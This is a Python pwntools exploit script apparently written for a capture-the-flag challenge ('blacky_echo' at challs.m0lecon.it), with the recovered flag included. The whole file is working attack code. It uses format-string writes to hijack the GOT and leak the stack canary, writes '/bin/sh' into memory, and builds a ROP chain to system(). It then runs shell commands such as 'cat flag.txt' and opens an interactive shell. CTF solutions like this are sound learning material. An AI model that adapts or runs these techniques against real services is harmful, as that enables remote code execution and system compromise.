#This exploit worked live during the ctf
#flag=ptm{gu3ss1ng_l1bc_h3re_w4s_t0t4lly_0k_m4n}
from pwn import *
#target=process('./blacky_echo')
target=remote('challs.m0lecon.it',9011)

context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="break *0x400b45")
#gdb.attach(target)

restart=0x400B54
exit_got=0x602088

def helper(addsize,addpayload):
	size=0x1000a+addsize
	print(target.recvuntil("Size: "))
	target.sendline(str(size))
	print(target.recvuntil("Input: "))
	payload="A"*0x1000a
	payload+=addpayload
	target.sendline(payload)

addpayload="%"+str(restart-21)+"x"
addpayload+="%8227$ln"
addpayload+="."*5
addpayload+=p64(exit_got)

helper(31,addpayload)

addpayload="%8228$p"

helper(8,addpayload)

print(target.recvuntil("err"))
canary_leak=int(target.recv(18),16)
print(hex(canary_leak))

writeaddr=0x602f00

addpayload="%"+str(0x622f-21)+"x"
addpayload+="%8226$n"
addpayload+=p64(writeaddr)

helper(23,addpayload)

addpayload="%"+str(0x6e69-21)+"x"
addpayload+="%8226$n"
addpayload+=p64(writeaddr+2)

helper(23,addpayload)

addpayload="%"+str(0x732f-21)+"x"
addpayload+="%8226$n"
addpayload+=p64(writeaddr+4)

helper(23,addpayload)

addpayload="%"+str(0x232068-21)+"x"
addpayload+="%8227$n"
addpayload+="."*6
addpayload+=p64(writeaddr+6)

helper(31,addpayload)

size=0x20001
systemplt=0x400840
poprdi=0x400d23
ret=0x4007ee
print(target.recvuntil("Size: "))
target.sendline(str(size))
print(target.recvuntil("Input: "))
payload="ECHO->"
payload+="A"*(0x10028-6)
payload+=p64(canary_leak)
payload+="A"*8
payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(writeaddr)
payload+=p64(systemplt)
target.sendline(payload)
cmd="whoami;pwd;ls;uname;cat flag.txt"
target.sendline(cmd)
target.interactive()



